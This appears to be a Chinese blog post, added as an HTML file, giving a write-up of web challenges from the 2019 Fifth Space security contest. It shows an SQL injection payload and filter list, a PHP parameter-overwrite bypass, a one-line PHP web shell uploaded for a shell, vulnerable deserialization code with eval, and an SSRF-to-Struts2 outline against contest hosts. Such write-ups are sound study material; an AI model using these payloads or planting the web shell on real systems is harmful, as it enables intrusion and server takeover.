@@ -1,0 +1,401 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>第五空间网络安全大赛Web Writeup | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="第五空间网络安全大赛Web Writeup | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+如何评价2019第五空间网络安全创新能力大赛线上赛？
+
+空相 100pt
+param is id 😃
+# 1.http://111.33.164.4:10001/?id=1%27
+param is id :)
+Username:admi..." />
+    <meta name="keywords" content="SQLi,SSRF,Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              第五空间网络安全大赛Web Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-08-30
+              </span>
+              <span>
+                4 min read
+              </span>
+              <span class="page-view" key="20190830155334" title="第五空间网络安全大赛Web Writeup">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/sqli/" class="post-tag">
+                  # SQLi
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ssrf/" class="post-tag">
+                  # SSRF
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <blockquote>
+<p><a href="https://www.zhihu.com/question/343194108">如何评价2019第五空间网络安全创新能力大赛线上赛？</a></p>
+</blockquote>
+<h3 id="空相-100pt">空相 100pt</h3>
+<p>param is id 😃</p>
+<pre><code class="language-bash"># 1.http://111.33.164.4:10001/?id=1%27
+param is id :)
+Username:admin
+Password:./25d99be830ad95b02f6f82235c8edcf7.php
+# 2.http://111.33.164.4:10001/25d99be830ad95b02f6f82235c8edcf7.php?token=1DJATMVRTTTG8Q00000020PH2SVDPVQ1
+flag{88d3e24c2cab001e159de86f8e8e3064}
+</code></pre>
+<h3 id="五叶-300pt">五叶 300pt</h3>
+<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-30-16-03-05.png" alt="" loading="lazy"></figure>
+<p>fuzz如下：</p>
+<pre><code class="language-sql"># Wrong! 未过滤
+' &quot; - # &amp; | ` ~ ! @ ; ,
+exp database sleep ascii mid where limit 
+# 非法字符 过滤
+* =
+and or from 
+select union insert update updatexml
+</code></pre>
+<p>Payload:</p>
+<pre><code class="language-sql">' || username like 'admin' -- 
+</code></pre>
+<p>猜测查询语句可能为:</p>
+<pre><code class="language-sql">select * form table_name where password = ('$password')
+</code></pre>
+<p>当注入得出的<strong>第一条</strong>记录为<code>admin</code>时，回显flag位置。</p>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-30-16-05-09.png" alt="" loading="lazy"></figure>
+<h3 id="空性-300pt">空性 300pt</h3>
+<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-30-16-08-28.png" alt="" loading="lazy"></figure>
+<p>F12查看源代码，注意到以下内容：</p>
+<pre><code class="language-js">&lt;script language=&quot;javascript&quot;&gt;
+      function check(){
+        var value = document.getElementById(&quot;txt1&quot;).value; 
+        if(!isRightFormat(value)){
+          alert(&quot;账户或密码错误！&quot;);
+          return false;
+        } 
+         
+		if(!hasRepeatNum(value)){
+          alert(&quot;账户或密码错误！&quot;);
+          return false;
+        } 
+		document.write('&lt;center&gt;&lt;br/&gt;&lt;a href=&quot;./151912db206ee052.php&quot;&gt;Welcome to you&lt;/a&gt;');  
+      }
+       
+      function isRightFormat(input){
+        return /Youguess$/.test(input);
+      }
+
+      function hasRepeatNum(input){
+		 return /Youguess$/.test(input);
+      } 
+    &lt;/script&gt;
+
+</code></pre>
+<p><code>./151912db206ee052.php</code> =&gt;听说你的Linux用的很6？=&gt; .151912db206ee052.php.swp(vi非正常退出隐藏文件 )</p>
+<pre><code class="language-php">//vi -r 151912db206ee052.php
+&lt;?php
+error_reporting(0);
+class First{
+  function firstlevel(){
+        $a='whoami';
+        extract($_GET);
+        $fname = $_GET['fname']?$_GET['fname']:'./js/ctf.js';
+        $content=trim(file_get_contents($fname));
+        if($a==$content)
+        {
+                echo 'ok';;
+        else
+        {
+                echo '听说你的Linux用的很6？';
+        }
+  }
+}
+$execfirst = new First();
+$execfirst -&gt; firstlevel();
+?&gt;
+</code></pre>
+<p>简单bypass：</p>
+<pre><code class="language-bash">http://111.33.164.4:10003/151912db206ee052.php?a=&amp;fname=x
+欢迎打开新世界的大门！
+# http://111.33.164.4:10003/2d019a311aaa30427.php?refer=df53ca268240ca76670c8566ee54568a&amp;t=20190828&amp;dtype=computer&amp;file=3792689baaabc7eb&amp;hash256=bfe028187b99faa722cefb30a2aa24d5
+</code></pre>
+<p>上传文件（白名单校验）处URL参数如下：</p>
+<pre><code class="language-bash">refer=df53ca268240ca76670c8566ee54568a //computer
+&amp;t=20190828
+&amp;dtype=computer
+&amp;file=3792689baaabc7eb //文件名
+&amp;hash256=86bea2686eb3078dcfc93e7b598c8576 //Unix时间戳哈希
+</code></pre>
+<p><code>file=filename</code>处存在文件包含，fuzz（脑洞）发现可以上传<code>.html</code>，=&gt; <code>file=upload/xxxxxxxx</code>(不含文件后缀)，即可Getshell，Payload:</p>
+<pre><code class="language-php">&lt;?php $f = $_GET[f]; $f($_GET[s]); ?&gt;
+</code></pre>
+<h3 id="八苦-300pt">八苦 300pt</h3>
+<p>tips：flag在/var/www/flag.php</p>
+<pre><code class="language-php">//http://111.33.164.6:10004/index.phps
+&lt;?php
+// flag.php in /var/html/www
+error_reporting(0);
+class Test{
+	protected $careful;
+	public $securuty;
+	public function __wakeup(){
+		if($this-&gt;careful===1){
+			phpinfo();	// step 1:	read source,get phpinfo and read it carefullt
+		}
+	}
+	public function __get($name){
+		return $this-&gt;securuty[$name];
+	}
+	public function __call($param1,$param2){
+		if($this-&gt;{$param1}){
+			eval('$a='.$_GET['dangerous'].';');
+		}
+	}
+}
+class User{
+	public $user;
+	public function __wakeup(){
+		$this-&gt;user=new Welcome();
+		$this-&gt;user-&gt;say_hello();
+	}
+}
+$a=serialize(new User);
+$string=$_GET['foo']??$a;
+unserialize($string);
+?&gt;
+</code></pre>
+<p>题目被部分师傅们持续搅屎以后，主办方放弃了修复此题。（据学长描述是通过PHP7.4的新特性解出 XD</p>
+<h3 id="六尘-500pt">六尘 500pt</h3>
+<ul>
+<li>正解</li>
+</ul>
+<pre><code class="language-bash">SSRF扫描端口 =&gt; Tomcat 8.0.53:8080 =&gt; Gopher攻击内网Struts2
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/2019-08-30-16-31-34.png" alt="" loading="lazy"></figure>
+<ul>
+<li>非预期</li>
+</ul>
+<p><code>./log/</code>泄露了Apache的access.log.txt，直接访问获取flag。</p>
+<pre><code class="language-bash">10.2.4.115 - - [27/Aug/2019:16:24:12 +0000] &quot;GET /flagishere/6be8b547d6db1d213c1ceecc30b3cb24.php?token=1DJ9R32OAQ81NF00000020PHT0AS6V7Usss HTTP/1.1&quot; 200 211 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;
+</code></pre>
+<h3 id="reference">Reference</h3>
+<ul>
+<li><a href="http://iv4n.xyz">👍👍👍 Iv4n | JBY</a></li>
+</ul>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#%E7%A9%BA%E7%9B%B8-100pt">空相 100pt</a></li>
+<li><a href="#%E4%BA%94%E5%8F%B6-300pt">五叶 300pt</a></li>
+<li><a href="#%E7%A9%BA%E6%80%A7-300pt">空性 300pt</a></li>
+<li><a href="#%E5%85%AB%E8%8B%A6-300pt">八苦 300pt</a></li>
+<li><a href="#%E5%85%AD%E5%B0%98-500pt">六尘 500pt</a></li>
+<li><a href="#reference">Reference</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-08-31-xxe-learning-note/">
+                <h3 class="post-title" style="text-align: left;">
+                  XML外部实体注入漏洞与利用学习
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-08-23-2019-De1taCTF/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  De1ta CTF 2019 Web Writeup
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
